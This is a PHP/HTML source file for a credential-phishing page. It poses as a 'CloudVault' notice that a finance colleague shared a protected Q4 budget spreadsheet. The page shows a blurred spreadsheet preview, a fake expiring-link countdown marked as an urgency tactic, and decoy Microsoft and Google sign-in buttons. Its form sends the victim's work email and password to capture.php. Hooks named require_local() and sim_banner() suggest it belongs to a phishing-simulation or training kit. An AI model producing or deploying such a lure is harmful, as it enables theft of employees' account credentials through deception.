<?php require __DIR__ . '/lib.php'; require_local(); ?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CloudVault — A document was shared with you</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  :root{--ink:#1b1f24;--blue:#0b5cab}
  @keyframes popIn{0%{opacity:0;transform:translateY(16px) scale(.99)}100%{opacity:1;transform:translateY(0) scale(1)}}
  @keyframes shimmer{0%{background-position:-420px 0}100%{background-position:420px 0}}
  @keyframes pulseLock{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
  @keyframes pulseDot{0%,100%{opacity:1}50%{opacity:.3}}
  body{font-family:'Segoe UI',Roboto,Arial,sans-serif;color:var(--ink);min-height:100vh;
    background:radial-gradient(1100px 600px at 75% -10%,#dbe7ff,transparent 60%),
      radial-gradient(900px 600px at 5% 110%,#e7f7ee,transparent 55%),#eef2f7;
    display:flex;align-items:center;justify-content:center;padding:30px 16px 64px}
  .brand{position:fixed;top:20px;left:26px;display:flex;align-items:center;gap:9px;font-weight:700;font-size:18px;color:var(--blue)}
  .brand .b{width:28px;height:28px;border-radius:7px;background:linear-gradient(135deg,#0b5cab,#2aa0e6);display:grid;place-items:center;box-shadow:0 6px 16px -6px rgba(11,92,171,.7)}
  .expire{position:fixed;top:21px;right:26px;display:flex;align-items:center;gap:8px;background:#fff;border:1px solid #ffd9b0;
    color:#b4590a;font-size:12px;font-weight:700;padding:7px 13px;border-radius:20px;box-shadow:0 8px 24px -14px rgba(180,89,10,.5)}
  .expire i{width:7px;height:7px;border-radius:50%;background:#f1860a;animation:pulseDot 1.2s infinite;font-style:normal}
  .wrap{width:100%;max-width:880px;display:grid;grid-template-columns:1fr 380px;gap:0;background:#fff;border:1px solid #e2e8f0;
    border-radius:16px;overflow:hidden;box-shadow:0 30px 80px -36px rgba(20,50,90,.45);animation:popIn .45s ease both}
  /* left: shared-document preview */
  .doc{position:relative;padding:26px;background:#f6f8fb;border-right:1px solid #e6ecf3;min-height:460px}
  .shared{display:flex;align-items:center;gap:11px;margin-bottom:16px}
  .shared .av{width:40px;height:40px;border-radius:50%;background:#0b5cab;color:#fff;display:grid;place-items:center;font-weight:700;box-shadow:0 6px 16px -8px rgba(11,92,171,.8)}
  .shared .who b{font-size:14px}.shared .who span{font-size:12px;color:#6b7c93;display:block;margin-top:1px}
  .msg{background:#eaf2fd;border:1px solid #d3e4fb;border-radius:11px;padding:11px 13px;font-size:12.5px;color:#2d4868;line-height:1.5;margin-bottom:16px}
  .filecard{display:flex;align-items:center;gap:12px;background:#fff;border:1px solid #e3e9f1;border-radius:11px;padding:13px 14px;margin-bottom:16px}
  .filecard .fi{width:42px;height:42px;border-radius:9px;background:#107c41;display:grid;place-items:center;color:#fff;font-weight:800;font-size:13px}
  .filecard .fn{font-size:14px;font-weight:600}.filecard .fm{font-size:11.5px;color:#7689a3;margin-top:2px}
  .filecard .dlc{margin-left:auto;font-size:11px;color:#7689a3;text-align:right}
  .preview{position:relative;border:1px solid #e3e9f1;border-radius:10px;overflow:hidden;background:#fff;height:244px}
  .preview .sheet{filter:blur(3.5px);opacity:.9;padding:0}
  .preview .lockover{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;
    gap:10px;background:rgba(246,248,251,.62);color:#46586f;font-size:13px;font-weight:600;backdrop-filter:blur(1px)}
  .preview .lockover .lk{width:46px;height:46px;border-radius:50%;background:#fff;border:1px solid #d6e2f2;display:grid;place-items:center;box-shadow:0 10px 24px -12px rgba(11,92,171,.6);animation:pulseLock 2.4s infinite}
  .preview .lockover .lk svg{width:24px;height:24px;color:var(--blue)}
  table.xl{width:100%;border-collapse:collapse;font-size:11px}
  table.xl td{border:1px solid #e6ecf3;padding:6px 8px;color:#33425a}
  table.xl tr:first-child td{background:#107c41;color:#fff;font-weight:700}
  table.xl tr:nth-child(even) td{background:#f4f8f5}
  .viewers{display:flex;align-items:center;gap:8px;margin-top:14px;font-size:11.5px;color:#6b7c93}
  .viewers .stack{display:flex}
  .viewers .stack span{width:22px;height:22px;border-radius:50%;border:2px solid #f6f8fb;margin-left:-7px;display:grid;place-items:center;color:#fff;font-size:9px;font-weight:700}
  /* right: sign-in */
  .auth{padding:30px 30px 26px}
  .auth h1{font-size:21px;font-weight:700;margin-bottom:5px}
  .auth .as{font-size:13px;color:#6b7c93;margin-bottom:18px;line-height:1.5}
  .provs{display:flex;flex-direction:column;gap:9px;margin-bottom:14px}
  .provs button{display:flex;align-items:center;justify-content:center;gap:10px;border:1px solid #dadce0;background:#fff;
    border-radius:9px;font-size:13.5px;font-weight:600;padding:10px;cursor:pointer;color:#3c4043;transition:background .15s}
  .provs button:hover{background:#f7f9fc}
  .provs img{width:17px;height:17px}
  .or{display:flex;align-items:center;gap:10px;color:#9aa7ba;font-size:11.5px;margin:2px 0 12px}
  .or::before,.or::after{content:"";flex:1;height:1px;background:#e4eaf2}
  label.f{display:block;font-size:12px;color:#52637b;margin:10px 0 5px;font-weight:600}
  .inp{width:100%;height:46px;border:1px solid #d4dce8;border-radius:9px;padding:0 13px;font-size:14px;outline:none;transition:border-color .15s,box-shadow .15s}
  .inp:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(11,92,171,.12)}
  .go{margin-top:18px;width:100%;background:var(--blue);color:#fff;border:none;border-radius:9px;font-size:14px;font-weight:700;
    padding:12px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:background .15s}
  .go:hover{background:#0a4f93}.go .sp{width:15px;height:15px;border:2px solid rgba(255,255,255,.5);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none}
  .go.loading .sp{display:inline-block}
  @keyframes spin{to{transform:rotate(360deg)}}
  .err{display:none;color:#d93025;font-size:12px;margin-top:8px}
  .alt{font-size:12.5px;color:var(--blue);margin-top:16px;display:flex;flex-direction:column;gap:7px}
  .alt a{cursor:pointer}
  .secure{display:flex;align-items:center;gap:7px;font-size:11px;color:#6b8a72;margin-top:18px;padding-top:14px;border-top:1px solid #eef2f7}
  .secure svg{width:14px;height:14px;color:#16a34a}
  @media(max-width:720px){.wrap{grid-template-columns:1fr}.doc{display:none}.expire{display:none}}
</style>
</head>
<body>
  <div class="brand"><span class="b"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M6 18a4 4 0 0 1 0-8 5 5 0 0 1 9.6-1.6A4.5 4.5 0 0 1 18 18Z"/></svg></span>CloudVault</div>
  <div class="expire"><i></i>Link expires in <span id="countdown">14:59</span></div>

  <div class="wrap">
    <div class="doc">
      <div class="shared">
        <div class="av">SM</div>
        <div class="who"><b>Sarah Mitchell</b><span>shared a document with you · Finance Dept.</span></div>
      </div>
      <div class="msg">&ldquo;Hi — here's the Q4 budget review ahead of tomorrow's call. Please check the Payroll line before 9am. Thanks, Sarah&rdquo;</div>
      <div class="filecard">
        <div class="fi">XLS</div>
        <div><div class="fn">Q4‑Budget‑Review‑2025.xlsx</div><div class="fm">Microsoft Excel · 248 KB · Protected</div></div>
        <div class="dlc">Shared<br>2 hours ago</div>
      </div>
      <div class="preview">
        <div class="sheet">
          <table class="xl">
            <tr><td>Department</td><td>Q3 Actual</td><td>Q4 Plan</td><td>Var %</td><td>Owner</td></tr>
            <tr><td>Operations</td><td>412,900</td><td>438,500</td><td>+6.2</td><td>J. Reyes</td></tr>
            <tr><td>Marketing</td><td>188,400</td><td>205,100</td><td>+8.9</td><td>A. Cole</td></tr>
            <tr><td>R&amp;D</td><td>522,000</td><td>560,750</td><td>+7.4</td><td>M. Shah</td></tr>
            <tr><td>Payroll</td><td>901,250</td><td>934,800</td><td>+3.7</td><td>S. Mitchell</td></tr>
            <tr><td>Facilities</td><td>142,700</td><td>151,300</td><td>+6.0</td><td>T. Nguyen</td></tr>
          </table>
        </div>
        <div class="lockover">
          <div class="lk"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></div>
          Sign in to view this protected document
        </div>
      </div>
      <div class="viewers">
        <div class="stack"><span style="background:#0b5cab">SM</span><span style="background:#7c3aed">AC</span><span style="background:#16a34a">MS</span></div>
        3 people in your organisation have access
      </div>
    </div>

    <div class="auth">
      <h1>Sign in to view</h1>
      <div class="as">This document is protected. Verify your work account to open <b>Q4‑Budget‑Review‑2025.xlsx</b>.</div>
      <div class="provs">
        <button type="button" onclick="focusEmail()"><img src="https://cdn.simpleicons.org/microsoftoffice" alt="" onerror="this.style.display='none'" />Sign in with Microsoft 365</button>
        <button type="button" onclick="focusEmail()"><img src="https://cdn.simpleicons.org/google" alt="" onerror="this.style.display='none'" />Sign in with Google Workspace</button>
      </div>
      <div class="or">or use your work email</div>
      <form id="frm" method="post" action="capture.php">
        <input type="hidden" name="extra" value="Q4-Budget-Review-2025.xlsx" />
        <label class="f">Work email</label>
        <input class="inp" type="email" name="email" id="email" placeholder="name@company.com" autocomplete="username" autofocus />
        <label class="f">Password</label>
        <input class="inp" type="password" name="password" id="password" placeholder="Password" autocomplete="current-password" />
        <div class="err" id="err">Enter your email and password to open the document.</div>
        <button class="go" id="goBtn" type="submit"><span class="sp"></span><span class="lbl">Verify &amp; Open Document</span></button>
        <div class="alt"><a>Use a one‑time code instead</a><a>Can't access your account?</a></div>
        <div class="secure"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2 4 5v6c0 5 3.5 8 8 9 4.5-1 8-4 8-9V5l-8-3Z"/><path d="m9 12 2 2 4-4"/></svg>Encrypted &amp; protected by CloudVault</div>
      </form>
    </div>
  </div>

  <script>
    function focusEmail(){ document.getElementById('email').focus(); }
    // urgency countdown
    var left=14*60+59, cd=document.getElementById('countdown');
    setInterval(function(){ if(left>0)left--; var m=Math.floor(left/60), s=left%60;
      cd.textContent=m+':'+(s<10?'0':'')+s; }, 1000);
    document.getElementById('frm').addEventListener('submit',function(ev){
      var em=document.getElementById('email').value.trim(), pw=document.getElementById('password').value;
      if(!em || !pw){ ev.preventDefault(); document.getElementById('err').style.display='block'; return; }
      document.getElementById('goBtn').classList.add('loading');
    });
  </script>
  <?= sim_banner() ?>
</body>
</html>
